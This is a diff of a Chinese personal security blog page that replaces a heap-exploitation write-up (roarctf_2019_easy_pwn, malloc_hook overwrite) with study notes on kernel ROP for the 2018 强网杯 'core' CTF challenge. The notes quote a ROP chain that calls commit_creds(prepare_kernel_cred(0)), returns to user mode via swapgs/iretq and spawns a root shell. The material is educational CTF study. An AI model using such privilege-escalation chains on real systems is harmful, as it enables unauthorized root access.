@@ -16,24 +16,24 @@
   <meta name="author" content="Hush">
   <meta name="keywords" content="">
   
-    <meta name="description" content="白天睡觉，晚上来写道题。 分析这道题涉及了unsortedbins，malloc_hook，堆溢出。 heap的菜单选项常规题，做到目前为止，主要是两个思路： 先check，根据RELRO。如果为full，那么就需要malloc_hook。如果为partial，就直接更改got表就可以了。 在create函数中可以明显看出来这是个结构体  一个结构体有24个字节，前8个为标志位，中间8个size位">
+    <meta name="description" content="初学kernel，做个笔记。 Kernel ROP - CTF Wiki wiki上有着详细的分析，这里只对一些wiki上没有讲到的做个笔记。 首先是对文件: 引用一句其他师傅的话：类比于libc中的pwn，感觉*.ko就是binary文件，vmlinux就是libc … 不同的是保护机制是由如何启动决定的（start.sh 中修改）。 Rop大体思路栈上有Canary防护的话，需要先泄露出Can">
 <meta property="og:type" content="article">
-<meta property="og:title" content="roarctf_2019_easy_pwn">
-<meta property="og:url" content="https://hushs1gnal.github.io/2021/07/29/roarctf_2019_easy_pwn/index.html">
+<meta property="og:title" content="kernel_ROP-2018_强网杯-core">
+<meta property="og:url" content="https://hushs1gnal.github.io/2022/05/24/kernelROP-2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/index.html">
 <meta property="og:site_name" content="Hush&#39;blog">
-<meta property="og:description" content="白天睡觉，晚上来写道题。 分析这道题涉及了unsortedbins，malloc_hook，堆溢出。 heap的菜单选项常规题，做到目前为止，主要是两个思路： 先check，根据RELRO。如果为full，那么就需要malloc_hook。如果为partial，就直接更改got表就可以了。 在create函数中可以明显看出来这是个结构体  一个结构体有24个字节，前8个为标志位，中间8个size位">
+<meta property="og:description" content="初学kernel，做个笔记。 Kernel ROP - CTF Wiki wiki上有着详细的分析，这里只对一些wiki上没有讲到的做个笔记。 首先是对文件: 引用一句其他师傅的话：类比于libc中的pwn，感觉*.ko就是binary文件，vmlinux就是libc … 不同的是保护机制是由如何启动决定的（start.sh 中修改）。 Rop大体思路栈上有Canary防护的话，需要先泄露出Can">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://hushs1gnal.github.io/img/hello1.jpg">
-<meta property="article:published_time" content="2021-07-28T20:57:39.000Z">
-<meta property="article:modified_time" content="2022-05-24T04:07:18.956Z">
+<meta property="og:image" content="https://hushs1gnal.github.io/img/hello5.jpg">
+<meta property="article:published_time" content="2022-05-24T04:34:34.889Z">
+<meta property="article:modified_time" content="2022-05-24T04:38:55.280Z">
 <meta property="article:author" content="Hush">
-<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="Pwn">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://hushs1gnal.github.io/img/hello1.jpg">
+<meta name="twitter:image" content="https://hushs1gnal.github.io/img/hello5.jpg">
   
   
   
-  <title>roarctf_2019_easy_pwn - Hush&#39;blog</title>
+  <title>kernel_ROP-2018_强网杯-core - Hush&#39;blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -184,7 +184,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="roarctf_2019_easy_pwn"></span>
+            <span id="subtitle" data-typed-text="kernel_ROP-2018_强网杯-core"></span>
           
         </div>
 
@@ -195,8 +195,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2021-07-29 04:57" pubdate>
-          2021年7月29日 凌晨
+        <time datetime="2022-05-24 12:34" pubdate>
+          2022年5月24日 下午
         </time>
       </span>
     
@@ -207,7 +207,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          903 字
+          1.6k 字
         
       </span>
     
@@ -247,32 +247,28 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">roarctf_2019_easy_pwn</h1>
+            <h1 style="display: none">kernel_ROP-2018_强网杯-core</h1>
             
             <div class="markdown-body">
               
-              <p>白天睡觉，晚上来写道题。</p>
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>这道题涉及了unsortedbins，malloc_hook，堆溢出。</p>
-<p>heap的菜单选项常规题，做到目前为止，主要是两个思路：</p>
-<p>先check，根据RELRO。如果为full，那么就需要malloc_hook。如果为partial，就直接更改got表就可以了。</p>
-<p>在create函数中可以明显看出来这是个结构体</p>
-<p><img src="/img/roarctf_2019_easy_pwn-1.png" srcset="/img/loading.gif" lazyload alt="roarctf_2019_easy_pwn-1"></p>
-<p>一个结构体有24个字节，前8个为标志位，中间8个size位，后8个是alloc出来的chunk的指针。</p>
-<p>（alloc和malloc不同的是 alloc的free后会清空用户数据区）</p>
-<p>其中a1 为基地址，我一开始还打算去找这个a1，</p>
-<p>但是看到这个a1的初始化。</p>
-<p><img src="/img/roarctf_2019_easy_pwn-2.png" srcset="/img/loading.gif" lazyload alt="roarctf_2019_easy_pwn-2"></p>
-<p>这里面buf是随机数字，所以a1搜寻未果。</p>
-<p><img src="/img/roarctf_2019_easy_pwn-3.png" srcset="/img/loading.gif" lazyload alt="roarctf_2019_easy_pwn-3"></p>
-<p>fill函数中，没有根据chunk的大小来限制写入大小。所以存在着溢出漏洞。</p>
-<p>主要思路就是，根据unsorted bin 中的fd。利用main_arean泄露libc（这个还没有查阅资料）</p>
-<p>然后利用之前布置好的盖在小块的大块来dump出来。</p>
-<p>接下来是漏洞利用。钩子函数详细，可以查阅这个资料<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41453285/article/details/99315504">https://blog.csdn.net/qq_41453285/article/details/99315504</a></p>
-<p>里面介绍的很清晰，具体思路就是，在钩子函数之前有一个为末位的一块内存区域，因为fastbin中没有对齐限制。所以我们可以修改fastbin中最后一个的fd指针，指向这里，让fastbin将它加入，然后在malloc一下，之后就可以通过溢出（具体溢出长度，上面那个资料中有详细的介绍）来修改malloc_hook 处的内容：malloc函数执行的时候会先检测__malloc_hook是否为空，如果不为空就执行__mallochook。所以这时候把malloc_hook 修改为一个one_gadget的地址（好像是存在这几个固定的地址。只需要libc的基地址加上这个偏移）</p>
-<p>那么最后再malloc一个chunk就可以触发 one_gadget。</p>
-<p>果然还是多做题才能多涨姿势。</p>
-<p>但是套路应该就是这几个套路了。</p>
-<p>难题可能在泄露libc上下难度，目前我觉得应该就是这几个套路了，后续继续学习新的漏洞利用手段。</p>
+              <p>初学kernel，做个笔记。</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/#_1">Kernel ROP - CTF Wiki</a></p>
+<p>wiki上有着详细的分析，这里只对一些wiki上没有讲到的做个笔记。</p>
+<p>首先是对文件:</p>
+<p>引用一句其他师傅的话：类比于libc中的pwn，感觉*.ko就是binary文件，vmlinux就是libc … 不同的是保护机制是由如何启动决定的（start.sh 中修改）。</p>
+<h1 id="Rop大体思路"><a href="#Rop大体思路" class="headerlink" title="Rop大体思路"></a>Rop大体思路</h1><p>栈上有Canary防护的话，需要先泄露出Canary，来促使Rop</p>
+<p>Rop具体思路是和Libc中的类似，利用一些寄存器进行传值</p>
+<p>调用commit_creds(prepare_kernel_cred(0))来提权</p>
+<p>最后回到用户态就可以system(‘bin&#x2F;sh’)</p>
+<p>思路是很好想的，但是具体是shellcode的写法。</p>
+<p>我们ropper出来的gadget中一部分是不能用的，而且也不是每次都能找到完美适合的gadget，这就比较考验我们写shellcode的功底。</p>
+<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>拿wiki上的shellcode来分析</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">rop[i++] = <span class="hljs-number">0</span>xffffffff81000b2f + offset; <span class="hljs-regexp">//</span> pop rdi; ret<br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = prepare_kernel_cred;         <span class="hljs-regexp">//</span> prepare_kernel_cred(<span class="hljs-number">0</span>)<br><br>rop[i++] = <span class="hljs-number">0</span>xffffffff810a0f49 + offset; <span class="hljs-regexp">//</span> pop rdx; ret<br>rop[i++] = <span class="hljs-number">0</span>xffffffff81021e53 + offset; <span class="hljs-regexp">//</span> pop rcx; ret<br>rop[i++] = <span class="hljs-number">0</span>xffffffff8101aa6a + offset; <span class="hljs-regexp">//</span> mov rdi, rax; call rdx; <br>rop[i++] = commit_creds;<br><br>rop[i++] = <span class="hljs-number">0</span>xffffffff81a012da + offset; <span class="hljs-regexp">//</span> swapgs; popfq; ret<br>rop[i++] = <span class="hljs-number">0</span>;<br><br>rop[i++] = <span class="hljs-number">0</span>xffffffff81050ac2 + offset; <span class="hljs-regexp">//</span> iretq; ret; <br><br>rop[i++] = (size_t)spawn_shell;         <span class="hljs-regexp">//</span> rip <br><br>rop[i++] = user_cs;<br>rop[i++] = user_rflags;<br>rop[i++] = user_sp;<br>rop[i++] = user_ss;<br><br>并且因为执行了mov rdi ，ra<br></code></pre></td></tr></table></figure>
+
+<p>x(rax一般作为返回值寄存器)rdi作为参数传递。然后swapgs 恢复寄存器的值，再用iretq 跳回用户态，这样就利用.ko文件的漏洞当前这个进程提权了，再进行system(‘bin&#x2F;sh’)就ok了</p>
+<p>&#96;rop[i++] &#x3D; 0xffffffff81000b2f + offset; &#x2F;&#x2F; pop rdi; ret<br>rop[i++] &#x3D; 0;<br>rop[i++] &#x3D; prepare_kernel_cred;         &#x2F;&#x2F; prepare_kernel_cred(0)</p>
+<p>rop[i++] &#x3D; 0xffffffff810a0f49 + offset; &#x2F;&#x2F; pop rdx; ret<br>rop[i++] &#x3D; 0xffffffff81021e53 + offset; &#x2F;&#x2F; pop rcx; ret<br>rop[i++] &#x3D; 0xffffffff8101aa6a + offset; &#x2F;&#x2F; mov rdi, rax; call rdx;<br>rop[i++] &#x3D; commit_creds;&#96;</p>
+<p>这部分的栈操作我分析了半个小时，shellcode功底并不好，后续还需要继续学习。原因是把call指令记错了。call 指令会先把当前的rip压入栈中，然后在进行jmp。这样在call rdx ，rdx再去执行pop rcx ；ret；时，ret就可以执行commit_creds 。如果 没有push操作，就会把commit_creds pop给了rcx，产生错误的理解。</p>
 
               
             </div>
@@ -295,7 +291,7 @@
   
     <span>></span>
     
-  <a href="/categories/Pwn/heap/" class="category-chain-item">heap</a>
+  <a href="/categories/Pwn/kernel/" class="category-chain-item">kernel</a>
   
   
 
@@ -312,7 +308,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/pwn/">#pwn</a>
+        <a href="/tags/Pwn/">#Pwn</a>
       
     </div>
   
@@ -324,8 +320,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>roarctf_2019_easy_pwn</div>
-      <div>https://hushs1gnal.github.io/2021/07/29/roarctf_2019_easy_pwn/</div>
+      <div>kernel_ROP-2018_强网杯-core</div>
+      <div>https://hushs1gnal.github.io/2022/05/24/kernelROP-2018强网杯-core/</div>
     </div>
     <div class="license-meta">
       
@@ -337,7 +333,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2021年7月29日</div>
+          <div>2022年5月24日</div>
         </div>
       
       
@@ -367,9 +363,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/11/18/sctf2019_easy_heap/" title="sctf2019_easy_heap">
+                      <a href="/2022/05/24/Pwncollege_shellocode_1/" title="PwnCollege_shellcode第一章">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">sctf2019_easy_heap</span>
+                        <span class="hidden-mobile">PwnCollege_shellcode第一章</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -377,8 +373,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/07/27/ZJCTF2019-EasyHeap/" title="ZJCTF2019-EasyHeap">
-                        <span class="hidden-mobile">ZJCTF2019-EasyHeap</span>
+                      <a href="/2022/05/24/cikucrawler/" title="爬虫抓取指定词语百度图片">
+                        <span class="hidden-mobile">爬虫抓取指定词语百度图片</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
